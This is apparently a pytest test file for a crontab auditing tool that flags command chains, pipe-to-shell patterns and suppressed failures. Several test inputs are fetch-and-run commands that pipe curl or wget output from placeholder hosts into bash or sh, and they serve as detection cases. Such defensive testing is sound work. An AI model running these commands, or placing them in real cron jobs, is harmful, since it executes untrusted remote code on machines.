import pytest
from crontab_audit.parser import CrontabEntry
from crontab_audit.chain_detector import (
    ChainIssue,
    _extract_chain_tokens,
    _is_pipe_to_shell,
    _is_silent_failure,
    check_chains,
)


def make_entry(command: str, host: str = "host1") -> CrontabEntry:
    return CrontabEntry(
        minute="0",
        hour="1",
        dom="*",
        month="*",
        dow="*",
        command=command,
        host=host,
        raw=f"0 1 * * * {command}",
    )


# --- _extract_chain_tokens ---

def test_extract_tokens_pipe():
    assert "|" in _extract_chain_tokens("cmd | grep foo")


def test_extract_tokens_and_and():
    assert "&&" in _extract_chain_tokens("cmd1 && cmd2")


def test_extract_tokens_semicolon():
    assert ";" in _extract_chain_tokens("cmd1; cmd2")


def test_extract_tokens_or_or():
    assert "||" in _extract_chain_tokens("cmd || true")


def test_extract_tokens_no_chain():
    assert _extract_chain_tokens("/usr/bin/backup.sh") == []


def test_extract_tokens_deduplicates():
    tokens = _extract_chain_tokens("a | b | c")
    assert tokens.count("|") == 1


# --- _is_pipe_to_shell ---

def test_pipe_to_bash_detected():
    assert _is_pipe_to_shell("curl http://example.com | bash")


def test_pipe_to_sh_detected():
    assert _is_pipe_to_shell("wget -q -O- http://x.com |sh")


def test_pipe_to_python_detected():
    assert _is_pipe_to_shell("cat script.py | python")


def test_safe_pipe_not_flagged():
    assert not _is_pipe_to_shell("ps aux | grep cron")


# --- _is_silent_failure ---

def test_silent_failure_or_true():
    assert _is_silent_failure("/opt/job.sh || true")


def test_silent_failure_exit_0():
    assert _is_silent_failure("/opt/job.sh || exit 0")


def test_not_silent_failure():
    assert not _is_silent_failure("/opt/job.sh && echo done")


# --- check_chains ---

def test_no_chain_returns_empty():
    entries = [make_entry("/usr/bin/backup.sh")]
    assert check_chains(entries) == []


def test_pipe_to_shell_is_warning():
    entry = make_entry("curl http://example.com/install.sh | bash")
    issues = check_chains([entry])
    assert len(issues) == 1
    assert issues[0].severity == "warning"
    assert "shell interpreter" in issues[0].reason


def test_silent_failure_is_warning():
    entry = make_entry("/opt/risky.sh || true")
    issues = check_chains([entry])
    assert len(issues) == 1
    assert issues[0].severity == "warning"
    assert "suppresses failure" in issues[0].reason


def test_plain_chain_is_info():
    entry = make_entry("/bin/cmd1 && /bin/cmd2")
    issues = check_chains([entry])
    assert len(issues) == 1
    assert issues[0].severity == "info"


def test_chain_tokens_populated():
    entry = make_entry("cmd1 | grep foo")
    issues = check_chains([entry])
    assert "|" in issues[0].chain_tokens


def test_str_representation_contains_host_and_reason():
    entry = make_entry("curl http://x.com | bash", host="webhost")
    issue = check_chains([entry])[0]
    text = str(issue)
    assert "webhost" in text
    assert "shell interpreter" in text


def test_multiple_entries_only_chains_flagged():
    entries = [
        make_entry("/safe/script.sh"),
        make_entry("cmd1 && cmd2"),
        make_entry("/another/safe.sh"),
    ]
    issues = check_chains(entries)
    assert len(issues) == 1
    assert "&&" in issues[0].chain_tokens
